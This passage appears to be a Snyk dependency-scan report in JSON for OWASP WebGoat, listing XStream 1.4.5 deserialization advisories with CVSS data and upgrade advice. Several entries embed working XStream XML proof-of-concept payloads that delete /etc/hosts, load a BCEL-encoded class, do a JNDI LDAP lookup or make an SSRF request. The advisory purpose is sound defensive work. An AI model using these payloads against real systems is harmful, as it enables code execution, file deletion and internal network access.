expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.16 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-21347.html)\n- [XStream Changelog](http://x-stream.github.io/changes.html#1.4.16)\n- [XStream Workaround](https://x-stream.github.io/security.html#workaround)\n",
      "disclosureTime": "2021-03-23T12:43:32Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.16"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088332",
      "identifiers": {
        "CWE": [
          "CWE-502",
          "CWE-94"
        ],
        "GHSA": [
          "GHSA-qpfq-ph7r-qv6f"
        ],
        "CVE": [
          "CVE-2021-21347"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-10-15T15:25:00.251127Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-03-23T17:13:22.228057Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-21347.html"
        },
        {
          "title": "XStream Changelog",
          "url": "http://x-stream.github.io/changes.html%231.4.16"
        },
        {
          "title": "XStream Workaround",
          "url": "https://x-stream.github.io/security.html%23workaround"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "severity": "critical",
          "modificationTime": "2022-02-16T16:10:19.083264Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-09-01T19:35:09.821130Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-05-03T22:11:05.610345Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.16)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.16"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N/E:P",
      "alternativeIds": [],
      "creationTime": "2021-03-23T13:00:34.694452Z",
      "credit": [
        "Liaogui Zhong"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. There is a vulnerability where the processed stream at unmarshalling time contains type information to recreate the formerly written objects. An attacker can manipulate the processed input stream and replace or inject objects, that result in the deletion of a file on the local host. \r\n\r\n### PoC\r\n```\r\n<java.util.PriorityQueue serialization='custom'>\r\n  <unserializable-parents/>\r\n  <java.util.PriorityQueue>\r\n    <default>\r\n      <size>2</size>\r\n      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>\r\n        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>\r\n          <packet>\r\n            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>\r\n              <dataSource class='com.sun.xml.internal.ws.encoding.MIMEPartStreamingDataHandler$StreamingDataSource'>\r\n                <part>\r\n                  <dataHead>\r\n                    <tail/>\r\n                    <head>\r\n                      <data class='com.sun.xml.internal.org.jvnet.mimepull.MemoryData'>\r\n                        <len>3</len>\r\n                        <data>AQID</data>\r\n                      </data>\r\n                    </head>\r\n                  </dataHead>\r\n                  <contentTransferEncoding>base64</contentTransferEncoding>\r\n                  <msg>\r\n                    <it class='java.util.ArrayList$Itr'>\r\n                      <cursor>0</cursor>\r\n                      <lastRet>1</lastRet>\r\n                      <expectedModCount>4</expectedModCount>\r\n                        <outer-class>\r\n                          <com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/>\r\n                          <com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/>\r\n                          <com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/>\r\n                          <com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/>\r\n                        </outer-class>\r\n                    </it>\r\n                    <in class='java.io.FileInputStream'>\r\n                      <fd/>\r\n                      <channel class='sun.nio.ch.FileChannelImpl'>\r\n                        <closeLock/>\r\n                        <open>true</open>\r\n                        <threads>\r\n                          <used>-1</used>\r\n                        </threads>\r\n                        <parent class='sun.plugin2.ipc.unix.DomainSocketNamedPipe'>\r\n                          <sockClient>\r\n                            <fileName>/etc/hosts</fileName>\r\n                            <unlinkFile>true</unlinkFile>\r\n                          </sockClient>\r\n                          <connectionSync/>\r\n                        </parent>\r\n                      </channel>\r\n                      <closeLock/>\r\n                    </in>\r\n                  </msg>\r\n                </part>\r\n              </dataSource>\r\n            </message>\r\n            <satellites/>\r\n            <invocationProperties/>\r\n          </packet>\r\n        </indexMap>\r\n      </comparator>\r\n    </default>\r\n    <int>3</int>\r\n    <string>javax.xml.ws.binding.attachments.inbound</string>\r\n    <string>javax.xml.ws.binding.attachments.inbound</string>\r\n  </java.util.PriorityQueue>\r\n</java.util.PriorityQueue>\r\n```\r\n\r\nUsers who follow [the recommendation](https://x-stream.github.io/security.html#workaround) to setup XStream's security framework with a whitelist limited to the minimal required types are not affected.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.16 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-21343.html)\n- [XStream Changelog](http://x-stream.github.io/changes.html#1.4.16)\n- [XStream Workaround](https://x-stream.github.io/security.html#workaround)\n",
      "disclosureTime": "2021-03-23T12:59:14Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.16"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088333",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-74cv-f58x-f9wf"
        ],
        "CVE": [
          "CVE-2021-21343"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-03-23T17:13:21.537900Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-03-23T17:13:21.536021Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-21343.html"
        },
        {
          "title": "XStream Changelog",
          "url": "http://x-stream.github.io/changes.html%231.4.16"
        },
        {
          "title": "XStream Workaround",
          "url": "https://x-stream.github.io/security.html%23workaround"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
          "cvssV3BaseScore": 7.5,
          "severity": "high",
          "modificationTime": "2022-02-16T16:10:19.199062Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",
          "cvssV3BaseScore": 5.9,
          "severity": "medium",
          "modificationTime": "2022-05-03T22:10:58.839125Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",
          "cvssV3BaseScore": 5.9,
          "severity": "medium",
          "modificationTime": "2022-09-01T15:59:41.661670Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.16)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.16"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:H/A:N/E:P",
      "alternativeIds": [],
      "creationTime": "2021-03-23T13:03:29.960798Z",
      "credit": [
        "wh1t3p1g"
      ],
      "cvssScore": 6.1,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. There is a vulnerability which may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. \r\n\r\n### PoC\r\n```\r\n<sorted-set>\r\n  <javax.naming.ldap.Rdn_-RdnEntry>\r\n    <type>ysomap</type>\r\n    <value class='javax.swing.MultiUIDefaults' serialization='custom'>\r\n      <unserializable-parents/>\r\n      <hashtable>\r\n        <default>\r\n          <loadFactor>0.75</loadFactor>\r\n          <threshold>525</threshold>\r\n        </default>\r\n        <int>700</int>\r\n        <int>0</int>\r\n      </hashtable>\r\n      <javax.swing.UIDefaults>\r\n        <default>\r\n          <defaultLocale>zh_CN</defaultLocale>\r\n          <resourceCache/>\r\n        </default>\r\n      </javax.swing.UIDefaults>\r\n      <javax.swing.MultiUIDefaults>\r\n        <default>\r\n          <tables>\r\n            <javax.swing.UIDefaults serialization='custom'>\r\n              <unserializable-parents/>\r\n              <hashtable>\r\n                <default>\r\n                  <loadFactor>0.75</loadFactor>\r\n                  <threshold>525</threshold>\r\n                </default>\r\n                <int>700</int>\r\n                <int>1</int>\r\n                <sun.swing.SwingLazyValue>\r\n                  <className>javax.naming.InitialContext</className>\r\n                  <methodName>doLookup</methodName>\r\n                  <args>\r\n                    <arg>ldap://localhost:1099/CallRemoteMethod</arg>\r\n                  </args>\r\n                </sun.swing.SwingLazyValue>\r\n              </hashtable>\r\n              <javax.swing.UIDefaults>\r\n                <default>\r\n                  <defaultLocale reference='../../../../../../../javax.swing.UIDefaults/default/defaultLocale'/>\r\n                  <resourceCache/>\r\n                </default>\r\n              </javax.swing.UIDefaults>\r\n            </javax.swing.UIDefaults>\r\n          </tables>\r\n        </default>\r\n      </javax.swing.MultiUIDefaults>\r\n    </value>\r\n  </javax.naming.ldap.Rdn_-RdnEntry>\r\n  <javax.naming.ldap.Rdn_-RdnEntry>\r\n    <type>ysomap</type>\r\n    <value class='com.sun.org.apache.xpath.internal.objects.XString'>\r\n      <m__obj class='string'>test</m__obj>\r\n    </value>\r\n  </javax.naming.ldap.Rdn_-RdnEntry>\r\n</sorted-set>\r\n```\r\n\r\nUsers who follow [the recommendation](https://x-stream.github.io/security.html#workaround) to setup XStream's security framework with a whitelist limited to the minimal required types are not affected.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.16 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-21346.html)\n- [XStream Changelog](http://x-stream.github.io/changes.html#1.4.16)\n- [XStream Workaround](https://x-stream.github.io/security.html#workaround)\n",
      "disclosureTime": "2021-03-23T13:02:09Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.16"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088334",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-4hrm-m67v-5cxr"
        ],
        "CVE": [
          "CVE-2021-21346"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-03-23T17:13:22.504542Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-03-23T17:13:22.502490Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-21346.html"
        },
        {
          "title": "XStream Changelog",
          "url": "http://x-stream.github.io/changes.html%231.4.16"
        },
        {
          "title": "XStream Workaround",
          "url": "https://x-stream.github.io/security.html%23workaround"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "severity": "critical",
          "modificationTime": "2022-02-16T16:10:18.855570Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-05-03T22:08:42.052783Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-09-01T19:34:26.899076Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.16)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.16"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N/E:P",
      "alternativeIds": [],
      "creationTime": "2021-03-23T13:05:10.380870Z",
      "credit": [
        "threedr3am"
      ],
      "cvssScore": 5.3,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. There is a vulnerability which may allow a remote attacker to execute arbitrary code only by manipulating the processed input stream. \r\n\r\n### PoC\r\n```\r\n<java.util.PriorityQueue serialization='custom'>\r\n  <unserializable-parents/>\r\n  <java.util.PriorityQueue>\r\n    <default>\r\n      <size>2</size>\r\n      <comparator class='javafx.collections.ObservableList$1'/>\r\n    </default>\r\n    <int>3</int>\r\n    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\r\n      <dataHandler>\r\n        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\r\n          <contentType>text/plain</contentType>\r\n          <is class='java.io.SequenceInputStream'>\r\n            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\r\n              <iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'>\r\n                <names class='java.util.AbstractList$Itr'>\r\n                  <cursor>0</cursor>\r\n                  <lastRet>-1</lastRet>\r\n                  <expectedModCount>0</expectedModCount>\r\n                  <outer-class class='java.util.Arrays$ArrayList'>\r\n                    <a class='string-array'>\r\n                      <string>$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$ddN$c20$Y$3d$85$c9$60$O$e5G$fcW$f0J0Qn$bc$c3$Y$T$83$89$c9$oF$M$5e$97$d9$60$c9X$c9$d6$R$5e$cb$h5$5e$f8$A$3e$94$f1$x$g$q$b1MwrN$cf$f9$be$b6$fb$fcz$ff$Ap$8a$aa$83$MJ$O$caX$cb$a2bp$dd$c6$86$8dM$86$cc$99$M$a5$3egH$d7$h$3d$G$ebR$3d$K$86UO$86$e2$s$Z$f5Et$cf$fb$B$v$rO$f9$3c$e8$f1H$g$fe$xZ$faI$c6T$c3kOd$d0bp$daS_$8c$b5Talc$8bxW$r$91$_$ae$a41$e7$8c$e9d$c8$t$dc$85$8d$ac$8dm$X$3b$d8$a5$d2j$y$c2$da1$afQ$D$3f$J$b8V$91$8b$3d$ecS$7d$Ta$u$98P3$e0$e1$a0$d9$e9$P$85$af$Z$ca3I$aa$e6ug$de$93$a1$f8g$bcKB$zG$d4$d6$Z$I$3d$t$95z$c3$fb$e7$a1$83$5bb$w$7c$86$c3$fa$c2nWG2$i$b4$W$D$b7$91$f2E$i$b7p$80$rzQ3$YM$ba$NR$c8$R$bb$md$84$xG$af$60oH$95$d2$_$b0$k$9eII$c11$3a$d2$f4$cd$c2$ow$9e$94eb$eeO$820$3fC$d0$$$fd$BZ$85Y$ae$f8$N$93$85$cf$5c$c7$B$A$A</string>\r\n                    </a>\r\n                  </outer-class>\r\n                </names>\r\n                <processorCL class='com.sun.org.apache.bcel.internal.util.ClassLoader'>\r\n                  <parent class='sun.misc.Launcher$ExtClassLoader'>\r\n                  </parent>\r\n                  <package2certs class='hashtable'/>\r\n                  <classes defined-in='java.lang.ClassLoader'/>\r\n                  <defaultDomain>\r\n                    <classloader class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='../..'/>\r\n                    <principals/>\r\n                    <hasAllPerm>false</hasAllPerm>\r\n                    <staticPermissions>false</staticPermissions>\r\n                    <key>\r\n                      <outer-class reference='../..'/>\r\n                    </key>\r\n                  </defaultDomain>\r\n                  <packages/>\r\n                  <nativeLibraries/>\r\n                  <assertionLock class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='..'/>\r\n                  <defaultAssertionStatus>false</defaultAssertionStatus>\r\n                  <classes/>\r\n                  <ignored__packages>\r\n                    <string>java.</string>\r\n                    <string>javax.</string>\r\n                    <string>sun.</string>\r\n                  </ignored__packages>\r\n                  <repository class='com.sun.org.apache.bcel.internal.util.SyntheticRepository'>\r\n                    <__path>\r\n                      <paths/>\r\n                      <class__path>.</class__path>\r\n                    </__path>\r\n                    <__loadedClasses/>\r\n                  </repository>\r\n                  <deferTo class='sun.misc.Launcher$ExtClassLoader' reference='../parent'/>\r\n                </processorCL>\r\n              </iterator>\r\n              <type>KEYS</type>\r\n            </e>\r\n            <in class='java.io.ByteArrayInputStream'>\r\n              <buf></buf>\r\n              <pos>0</pos>\r\n              <mark>0</mark>\r\n              <count>0</count>\r\n            </in>\r\n          </is>\r\n          <consumed>false</consumed>\r\n        </dataSource>\r\n        <transferFlavors/>\r\n      </dataHandler>\r\n      <dataLen>0</dataLen>\r\n    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\r\n    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>\r\n  </java.util.PriorityQueue>\r\n</java.util.PriorityQueue>\r\n```\r\n\r\nUsers who follow [the recommendation](https://x-stream.github.io/security.html#workaround) to setup XStream's security framework with a whitelist limited to the minimal required types are not affected.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.16 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-21350.html)\n- [XStream Changelog](http://x-stream.github.io/changes.html#1.4.16)\n- [XStream Workaround](https://x-stream.github.io/security.html#workaround)\n",
      "disclosureTime": "2021-03-23T13:03:44Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.16"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088335",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-43gc-mjxg-gvrq"
        ],
        "CVE": [
          "CVE-2021-21350"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-05-02T15:26:49.015721Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-03-23T17:13:22.887658Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-21350.html"
        },
        {
          "title": "XStream Changelog",
          "url": "http://x-stream.github.io/changes.html%231.4.16"
        },
        {
          "title": "XStream Workaround",
          "url": "https://x-stream.github.io/security.html%23workaround"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 9.8,
          "severity": "critical",
          "modificationTime": "2022-02-16T16:10:18.278601Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-09-01T19:35:11.583013Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-05-03T22:10:10.008620Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.16)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "medium",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.16"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:H/A:N/E:P",
      "alternativeIds": [],
      "creationTime": "2021-03-23T13:06:43.439480Z",
      "credit": [
        "threedr3am"
      ],
      "cvssScore": 6.1,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. There is a vulnerability which may allow a remote attacker to request data from internal resources that are not publicly available (SSRF) only by manipulating the processed input stream. \r\n\r\n### PoC\r\n```\r\n<java.util.PriorityQueue serialization='custom'>\r\n  <unserializable-parents/>\r\n  <java.util.PriorityQueue>\r\n    <default>\r\n      <size>2</size>\r\n      <comparator class='javafx.collections.ObservableList$1'/>\r\n    </default>\r\n    <int>3</int>\r\n    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\r\n      <dataHandler>\r\n        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\r\n          <contentType>text/plain</contentType>\r\n          <is class='java.io.SequenceInputStream'>\r\n            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\r\n              <iterator class='com.sun.xml.internal.ws.util.ServiceFinder$ServiceNameIterator'>\r\n                <configs class='sun.misc.FIFOQueueEnumerator'>\r\n                  <queue>\r\n                    <length>1</length>\r\n                    <head>\r\n                      <obj class='url'>http://localhost:8080/internal/</obj>\r\n                    </head>\r\n                    <tail reference='../head'/>\r\n                  </queue>\r\n                  <cursor reference='../queue/head'/>\r\n                </configs>\r\n                <returned class='sorted-set'/>\r\n              </iterator>\r\n              <type>KEYS</type>\r\n            </e>\r\n            <in class='java.io.ByteArrayInputStream'>\r\n              <buf></buf>\r\n              <pos>0</pos>\r\n              <mark>0</mark>\r\n              <count>0</count>\r\n            </in>\r\n          </is>\r\n          <consumed>false</consumed>\r\n        </dataSource>\r\n        <transferFlavors/>\r\n      </dataHandler>\r\n      <dataLen>0</dataLen>\r\n    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\r\n    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>\r\n  